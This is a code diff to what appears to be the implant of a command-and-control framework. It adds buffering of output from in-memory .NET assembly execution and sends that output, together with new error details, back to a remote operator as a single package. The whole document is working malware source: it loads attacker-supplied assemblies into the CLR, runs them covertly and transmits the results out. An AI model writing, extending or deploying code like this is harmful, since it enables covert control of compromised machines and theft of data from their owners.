@@ -47,6 +47,42 @@ DWORD WINAPI DotnetInvokeThreadProc( LPVOID lpParam )
     return (DWORD) hr;
 }
 
+/* Drain pipe into a growing buffer. Returns new buffer pointer (caller must free).
+ * *pBuf and *pLen are updated in place. */
+VOID DotnetDrainToBuffer( PVOID* pBuf, DWORD* pLen )
+{
+    DWORD Avail     = 0;
+    DWORD BytesRead = 0;
+
+    if ( ! Instance->Dotnet || ! Instance->Dotnet->Pipe || Instance->Dotnet->Pipe == INVALID_HANDLE_VALUE )
+        return;
+
+    if ( ! Instance->Win32.PeekNamedPipe( Instance->Dotnet->Pipe, NULL, 0, NULL, &Avail, NULL ) )
+        return;
+
+    if ( Avail == 0 )
+        return;
+
+    PVOID NewBuf = MmHeapAlloc( *pLen + Avail );
+    if ( ! NewBuf )
+        return;
+
+    if ( *pBuf && *pLen > 0 )
+        MemCopy( NewBuf, *pBuf, *pLen );
+
+    if ( Instance->Win32.ReadFile( Instance->Dotnet->Pipe, (PBYTE)NewBuf + *pLen, Avail, &BytesRead, NULL ) && BytesRead > 0 )
+    {
+        if ( *pBuf )
+            MmHeapFree( *pBuf );
+        *pBuf = NewBuf;
+        *pLen += BytesRead;
+    }
+    else
+    {
+        MmHeapFree( NewBuf );
+    }
+}
+
 BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
 {
     PPACKAGE       PackageInfo    = NULL;
@@ -60,6 +96,8 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     HRESULT        Result         = S_OK;
     BOOL           AmsiIsLoaded   = FALSE;
     HANDLE         hInvokeThread  = NULL;
+    PVOID          AccumBuf       = NULL;
+    DWORD          AccumLen       = 0;
 
     if ( ! Assembly.Buffer || ! Assembly.Length )
         return FALSE;
@@ -124,6 +162,9 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         & Instance->Dotnet->ICorRuntimeHost
     ) ) {
         PUTS( "Couldn't start CLR" )
+        Instance->Dotnet->InvokeResult = E_FAIL;
+        Instance->Dotnet->ErrorDetail.Buffer = (PVOID) L"CLR initialization failed";
+        Instance->Dotnet->ErrorDetail.Length  = 25 * sizeof( WCHAR );
         return FALSE;
     }
 
@@ -192,21 +233,31 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     PUTS( "CreateDomain..." )
     if ( ( Result = Instance->Dotnet->ICorRuntimeHost->lpVtbl->CreateDomain( Instance->Dotnet->ICorRuntimeHost, Instance->Dotnet->AppDomainName.Buffer, NULL, &Instance->Dotnet->AppDomainThunk ) ) ) {
         PRINTF( "CreateDomain Failed: %x\n", Result )
+        Instance->Dotnet->InvokeResult = Result;
+        Instance->Dotnet->ErrorDetail.Buffer = (PVOID) L"CreateDomain failed";
+        Instance->Dotnet->ErrorDetail.Length  = 19 * sizeof( WCHAR );
         return FALSE;
     }
 
     PUTS( "QueryInterface..." )
     if ( ( Result = Instance->Dotnet->AppDomainThunk->lpVtbl->QueryInterface( Instance->Dotnet->AppDomainThunk, &xIID_AppDomain, (LPVOID*)&Instance->Dotnet->AppDomain ) ) ) {
         PRINTF( "QueryInterface Failed: %x\n", Result )
+        Instance->Dotnet->InvokeResult = Result;
+        Instance->Dotnet->ErrorDetail.Buffer = (PVOID) L"QueryInterface (AppDomain) failed";
+        Instance->Dotnet->ErrorDetail.Length  = 33 * sizeof( WCHAR );
         return FALSE;
     }
 
     if ( ( Result = Instance->Win32.SafeArrayAccessData( Instance->Dotnet->SafeArray, &AssemblyData.Buffer ) ) ) {
         PRINTF( "SafeArrayAccessData Failed: %x\n", Result )
+        Instance->Dotnet->InvokeResult = Result;
+        Instance->Dotnet->ErrorDetail.Buffer = (PVOID) L"SafeArrayAccessData failed";
+        Instance->Dotnet->ErrorDetail.Length  = 26 * sizeof( WCHAR );
         return FALSE;
     }
 
     PUTS( "Copy assembly to buffer..." )
+
     MemCopy( AssemblyData.Buffer, Assembly.Buffer, Assembly.Length );
 
     if ( ( Result = Instance->Win32.SafeArrayUnaccessData( Instance->Dotnet->SafeArray ) ) ) {
@@ -215,14 +266,21 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     }
 
     PUTS( "AppDomain Load..." )
+
     if ( ( Result = Instance->Dotnet->AppDomain->lpVtbl->Load_3( Instance->Dotnet->AppDomain, Instance->Dotnet->SafeArray, &Instance->Dotnet->Assembly ) ) ) {
         PRINTF( "AppDomain Failed: %x\n", Result )
+        Instance->Dotnet->InvokeResult = Result;
+        Instance->Dotnet->ErrorDetail.Buffer = (PVOID) L"Load_3 (assembly load) failed";
+        Instance->Dotnet->ErrorDetail.Length  = 29 * sizeof( WCHAR );
         return FALSE;
     }
 
     PUTS( "Assembly EntryPoint..." )
     if ( ( Result = Instance->Dotnet->Assembly->lpVtbl->EntryPoint( Instance->Dotnet->Assembly, &Instance->Dotnet->MethodInfo ) ) ) {
         PRINTF( "Assembly EntryPoint Failed: %x\n", Result )
+        Instance->Dotnet->InvokeResult = Result;
+        Instance->Dotnet->ErrorDetail.Buffer = (PVOID) L"EntryPoint retrieval failed";
+        Instance->Dotnet->ErrorDetail.Length  = 27 * sizeof( WCHAR );
         return FALSE;
     }
 
@@ -288,9 +346,9 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     {
         Instance->Dotnet->Thread = hInvokeThread;
 
-        /* Poll: wait a short interval for the thread to finish, then drain
-         * whatever the assembly has written since the last pass. Repeat
-         * until the thread exits. */
+        /* Drain pipe into a buffer while the assembly runs. We accumulate
+         * everything and send it as one package at the end so the operator
+         * gets a single consolidated output block. */
         for ( ;; )
         {
             DWORD WaitResult = Instance->Win32.WaitForSingleObjectEx(
@@ -298,7 +356,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
                 DOTNET_DRAIN_INTERVAL_MS,
                 FALSE );
 
-            DotnetPushPipe();
+            DotnetDrainToBuffer( &AccumBuf, &AccumLen );
 
             if ( WaitResult == WAIT_OBJECT_0 )
                 break;
@@ -321,14 +379,30 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
 
     Instance->Dotnet->Invoked = TRUE;
 
-    /* One last drain to catch anything the assembly emitted between the
-     * final wait and thread exit. */
-    DotnetPushPipe();
+    /* Final drain to catch anything between the last wait and thread exit. */
+    DotnetDrainToBuffer( &AccumBuf, &AccumLen );
+
+    /* Send all accumulated output as a single package. */
+    if ( AccumLen > 0 && AccumBuf )
+    {
+        PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, Instance->Dotnet->RequestID );
+        PackageAddBytes( Package, AccumBuf, AccumLen );
+        PackageTransmit( Package );
+    }
+
+    if ( AccumBuf )
+    {
+        MemSet( AccumBuf, 0, AccumLen );
+        MmHeapFree( AccumBuf );
+        AccumBuf = NULL;
+        AccumLen = 0;
+    }
 
     if ( Instance->Dotnet->InvokeResult != S_OK )
     {
         PRINTF( "Invoke Assembly Failed: %x\n", Instance->Dotnet->InvokeResult )
-        /* Report failure but don't discard the (already drained) output. */
+        Instance->Dotnet->ErrorDetail.Buffer = (PVOID) L"Invoke_3 (assembly execution) failed";
+        Instance->Dotnet->ErrorDetail.Length  = 36 * sizeof( WCHAR );
         return FALSE;
     }
 
@@ -408,6 +482,9 @@ VOID DotnetPush()
         {
             Package = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance->Dotnet->RequestID );
             PackageAddInt32( Package, DOTNET_INFO_FAILED );
+            if ( Instance->Dotnet->ErrorDetail.Buffer && Instance->Dotnet->ErrorDetail.Length > 0 ) {
+                PackageAddBytes( Package, Instance->Dotnet->ErrorDetail.Buffer, Instance->Dotnet->ErrorDetail.Length );
+            }
             PackageTransmit( Package );
         }
 
